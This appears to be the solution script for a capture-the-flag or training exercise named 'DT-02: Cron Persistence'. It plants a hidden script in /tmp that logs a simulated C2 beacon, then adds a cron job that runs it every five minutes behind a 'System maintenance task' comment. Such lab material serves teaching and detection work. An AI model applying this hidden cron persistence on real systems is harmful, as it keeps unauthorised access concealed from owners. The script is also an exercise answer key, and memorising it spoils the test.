#!/bin/bash
#######################################
# DT-02: Cron Persistence - SOLUTION
#######################################

PERSIST_SCRIPT="/tmp/.persistence.sh"

# Create the persistence script
cat > "$PERSIST_SCRIPT" << 'EOF'
#!/bin/bash
# Persistence beacon - simulates C2 check-in
LOG="/tmp/.beacon.log"
echo "[$(date)] Beacon check-in from $(whoami)@$(hostname) - FLAG{cron_persistence}" >> "$LOG"
EOF

chmod +x "$PERSIST_SCRIPT"

# Backup current crontab
crontab -l > /tmp/.cron_backup 2>/dev/null

# Add persistence cron entry
(crontab -l 2>/dev/null; echo "# System maintenance task") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * $PERSIST_SCRIPT >/dev/null 2>&1") | crontab -

echo "[ATTACK] Persistence installed"
echo "[ATTACK] Script: $PERSIST_SCRIPT"
echo "[ATTACK] Cron entry added (every 5 min)"
